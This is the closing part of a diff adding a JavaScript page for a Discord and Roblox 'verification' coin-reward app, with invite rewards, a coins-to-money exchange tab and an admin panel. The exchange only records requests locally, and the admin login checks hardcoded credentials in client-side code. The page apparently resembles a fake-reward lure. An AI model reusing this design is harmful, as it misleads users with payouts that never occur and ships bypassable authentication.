+      alert(`Insufficient coins! You have ${coinBalance} coins. Need at least 10,000 coins.`);
+      return;
+    }
+    const amount = 10000;
+    const currency = prompt("Select currency: USD, EUR, GBP, INR, JPY, BRL, CAD, AUD", "USD");
+    const method = prompt("Select method: PayPal, Bank Transfer, Crypto, Revolut", "PayPal");
+    if(currency && method) {
+      coinBalance -= amount;
+      exchangeRequests.unshift({ amount, currency, method, status: "Processing" });
+      alert(`✅ Exchange request submitted!`);
+      renderExchangeHistory();
+      renderInviteStats();
+    }
+  }
+  
+  function renderAdminPanel() {
+    if(!document.getElementById('adminPanelTab')) {
+      const adminHtml = `<div id="adminPanelTab" class="content-section card" style="display:none;"><div class="card-header"><i class="fas fa-user-shield"></i> Admin Panel</div><div id="adminLoginArea"><input type="text" id="adminUser" placeholder="Username"><br><input type="password" id="adminPass" placeholder="Password"><br><button id="adminLoginBtn" class="verify-btn active">Login</button></div><div id="adminTools" style="display:none;"><input type="text" id="adminCoinAmount" placeholder="Coin amount"><div style="display:flex; gap:10px;"><button id="adminAddCoin" class="verify-btn active">+ Add</button><button id="adminMinusCoin" class="verify-btn active">- Remove</button></div><div id="adminCoinsPanel"></div><button id="adminBanUserBtn" class="verify-btn active">Ban User</button></div></div>`;
+      document.getElementById('mainContent').insertAdjacentHTML('beforeend', adminHtml);
+      document.getElementById('adminLoginBtn').addEventListener('click', () => {
+        if(document.getElementById('adminUser').value === ADMIN_USER && document.getElementById('adminPass').value === ADMIN_PASS) {
+          adminLoggedIn = true;
+          document.getElementById('adminLoginArea').style.display = 'none';
+          document.getElementById('adminTools').style.display = 'block';
+          updateAdminCoinUI();
+        } else alert("Invalid credentials");
+      });
+      document.getElementById('adminAddCoin').addEventListener('click', () => { if(adminLoggedIn){ coinBalance += parseInt(document.getElementById('adminCoinAmount').value)||0; updateAdminCoinUI(); renderInviteStats(); updateRobloxRewardUI(); } });
+      document.getElementById('adminMinusCoin').addEventListener('click', () => { if(adminLoggedIn){ coinBalance = Math.max(0, coinBalance - (parseInt(document.getElementById('adminCoinAmount').value)||0)); updateAdminCoinUI(); renderInviteStats(); updateRobloxRewardUI(); } });
+      document.getElementById('adminBanUserBtn').addEventListener('click', () => { if(adminLoggedIn && confirm("Ban user?")) location.reload(); });
+    }
+    updateAdminCoinUI();
+  }
+  
+  function updateAdminCoinUI() {
+    const coinPanel = document.getElementById('adminCoinsPanel');
+    if(coinPanel) coinPanel.innerHTML = `💰 Balance: ${coinBalance} coins<br>📊 Invites: ${totalInvites}<br>✅ Verified Friends: ${invitedFriends.filter(f=>f.verified).length}`;
+  }
+  
+  function updateVerificationFlow() {
+    const sections = ['robloxVerifyTab', 'groupCommunityTab', 'joinPlayerTab'];
+    if(robloxLoggedIn && document.getElementById('groupCommunityTab')) document.getElementById('groupCommunityTab').style.display = "block";
+    if(groupJoinedFlag && document.getElementById('joinPlayerTab')) document.getElementById('joinPlayerTab').style.display = "block";
+    const robloxDot = document.getElementById('robloxStatusDot');
+    if(robloxDot) robloxDot.className = robloxLoggedIn ? "status-dot green" : "status-dot red";
+  }
+  
+  function switchToTab(tabId) {
+    const sections = ['discordAuthTab', 'robloxVerifyTab', 'groupCommunityTab', 'joinPlayerTab', 'coinShareTab', 'robloxRewardTab', 'exchangeTab', 'inviteStatsTab', 'adminPanelTab'];
+    sections.forEach(id => { const el = document.getElementById(id); if(el) el.style.display = (id === tabId) ? "block" : "none"; });
+    if(tabId === 'coinShareTab' && !document.getElementById('coinShareTab')) {
+      const shareHtml = `<div id="coinShareTab" class="content-section card"><div class="card-header"><i class="fas fa-share-alt"></i> Share & Earn</div><button id="shareLinkBtn" class="verify-btn active">🔗 Generate Invite Link</button><div class="invite-requirement"><i class="fas fa-info-circle"></i> You get 100 coins ONLY when your invited friend completes Discord verification!</div></div>`;
+      document.getElementById('mainContent').insertAdjacentHTML('beforeend', shareHtml);
+      document.getElementById('shareLinkBtn').addEventListener('click', generateShareLink);
+    }
+    if(tabId === 'robloxRewardTab') loadRobloxRewardTab();
+    if(tabId === 'exchangeTab' && !document.getElementById('exchangeTab')) {
+      const exchangeHtml = `<div id="exchangeTab" class="content-section card"><div class="card-header"><i class="fas fa-exchange-alt"></i> Exchange (10k Coins → Money)</div><button id="exchangeStartBtn" class="verify-btn active">Request Exchange</button><div id="exchangeHistoryList" style="background:#0c0f18; border-radius:16px; padding:10px;"></div></div>`;
+      document.getElementById('mainContent').insertAdjacentHTML('beforeend', exchangeHtml);
+      document.getElementById('exchangeStartBtn').addEventListener('click', openExchange);
+      renderExchangeHistory();
+    }
+    if(tabId === 'inviteStatsTab' && !document.getElementById('inviteStatsTab')) {
+      const statHtml = `<div id="inviteStatsTab" class="content-section card"><div class="card-header"><i class="fas fa-chart-line"></i> Invite Stats</div><div id="inviteStatsDisplay" style="padding:15px; background:#0f1222; border-radius:15px;"></div></div>`;
+      document.getElementById('mainContent').insertAdjacentHTML('beforeend', statHtml);
+      renderInviteStats();
+    }
+    if(tabId === 'adminPanelTab') renderAdminPanel();
+  }
+  
+  document.getElementById('hamburgerBtn').onclick = () => document.getElementById('donerMenu').classList.add('open');
+  document.getElementById('closeMenuBtn').onclick = () => document.getElementById('donerMenu').classList.remove('open');
+  document.querySelectorAll('.doner-menu li').forEach(li => {
+    li.addEventListener('click', () => {
+      const tab = li.getAttribute('data-tab');
+      if(tab) switchToTab(tab);
+      document.getElementById('donerMenu').classList.remove('open');
+    });
+  });
+  
+  const initialHtml = `<div id="discordAuthTab" class="content-section card"><div class="card-header"><i class="fab fa-discord"></i> Discord Authorization</div><button id="discordAuthBtn" class="verify-btn active"><i class="fab fa-discord"></i> Start Verification</button><div id="discordStatus" class="warning-msg">⚠️ Not authorized yet.</div></div>`;
+  document.getElementById('mainContent').innerHTML = initialHtml;
+  document.getElementById('discordAuthBtn').addEventListener('click', performDiscordAuth);
+  switchToTab('discordAuthTab');
+  preventNewTabs();
+  
+  window.verifyFriend = verifyFriend;
+</script>
+</body>
+</html>
